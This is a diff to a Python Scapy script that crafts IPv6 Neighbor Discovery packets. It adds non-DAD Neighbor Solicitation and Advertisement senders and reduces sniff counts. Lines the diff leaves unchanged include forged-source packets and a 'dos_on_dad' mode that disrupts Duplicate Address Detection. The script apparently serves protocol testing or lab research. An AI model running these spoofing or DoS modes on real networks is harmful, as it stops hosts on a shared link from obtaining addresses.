@@ -10,6 +10,7 @@ globalSrcAddr = "2001:db8:0:1:c0bc:a2a0:21d6:6a0b"
 globalDstAddr = "ff02::1"
 
 linkSrcAddr = "fe80::437f:2137:3e16:b6ea"
+linkOtherSrcAddr = "fe80::437f:2137:3e16:b6eb"
 linkDstAddr = "ff02::1"
 linkFakeSrc = "fe80::437f:2137:3e16:ffff"
 
@@ -32,11 +33,17 @@ def dos_on_dad(pkt):
 def send_ns_pkt(pkt):
     ns_pkt(linkSrcAddr)
 
+def send_not_dad_ns_pkt(pkt):
+    not_dad_ns_pkt(linkSrcAddr)
+
 def send_forge_ns_pkt(pkt):
     forge_ns_pkt_with_fake_src(linkSrcAddr)
 
 def send_na_pkt(pkt):
     na_pkt(linkSrcAddr)
+
+def send_not_dad_na_pkt(pkt):
+    not_dad_na_pkt(linkOtherSrcAddr)
 
 def send_forge_na_pkt(pkt):
     forge_na_pkt_with_diff_src_tgr(linkSrcAddr)
@@ -46,7 +53,15 @@ def ns_pkt(target_address):
     a=IPv6(src="::", dst='ff02::1:ff21:41f')
     b=ICMPv6ND_NS(tgt=target_address)
     print "send NS packet target address:",target_address
-    sendp(ether/a/b,iface=ifaceName)    
+    sendp(ether/a/b,iface=ifaceName)
+
+def not_dad_ns_pkt(target_address):
+    ether=Ether(src=macSrcAddr,dst=macSrcAddr)
+    a=IPv6(src=target_address, dst='ff02::1:ff21:41f')
+    b=ICMPv6ND_NS(tgt=target_address)
+    print "send NS packet target address:",target_address
+    sendp(ether/a/b,iface=ifaceName)
+
 
 def forge_ns_pkt_with_fake_src(target_address):
     ether=Ether(src=macSrcAddr,dst=macMultiAddr)
@@ -72,6 +87,13 @@ def na_pkt(target_address):
     print "send NA packet target address:",target_address
     sendp(ether/a/b,iface=ifaceName)
 
+def not_dad_na_pkt(target_address):
+    ether=Ether(src=macSrcAddr,dst=macSrcAddr)
+    a=IPv6(src=target_address, dst=linkDstAddr)
+    b=ICMPv6ND_NA(tgt=target_address)
+    print "send NA packet target address:",target_address
+    sendp(ether/a/b,iface=ifaceName)
+
 def forge_na_pkt_with_diff_src_tgr(target_address):
     ether=Ether(src=macSrcAddr,dst=macMultiAddr)
     a=IPv6(src=linkFakeSrc, dst=linkDstAddr)
@@ -83,11 +105,15 @@ if __name__ == "__main__":
     #sniff(filter="ip6",prn=ipv6_monitor_callback,iface=ifaceName,count=1)
     if len(sys.argv)>1:
         if sys.argv[1] == "ns":
-            sniff(filter="ip6",prn=send_ns_pkt,iface=ifaceName,count=100)
+            sniff(filter="ip6",prn=send_ns_pkt,iface=ifaceName,count=3)
         if sys.argv[1] == "na":
-            sniff(filter="ip6",prn=send_na_pkt,iface=ifaceName,count=100)
+            sniff(filter="ip6",prn=send_na_pkt,iface=ifaceName,count=3)
+        if sys.argv[1] == "ns-not-dad":
+            sniff(filter="ip6",prn=send_not_dad_ns_pkt,iface=ifaceName,count=3)
+        if sys.argv[1] == "na-not-dad":
+            sniff(filter="ip6",prn=send_not_dad_na_pkt,iface=ifaceName,count=3)
         if sys.argv[1] == "dos":
-            sniff(filter="ip6",prn=dos_on_dad,iface=ifaceName,count=100)
+            sniff(filter="ip6",prn=dos_on_dad,iface=ifaceName,count=3)
     else:
         while True:
             way = random.randint(0,4)
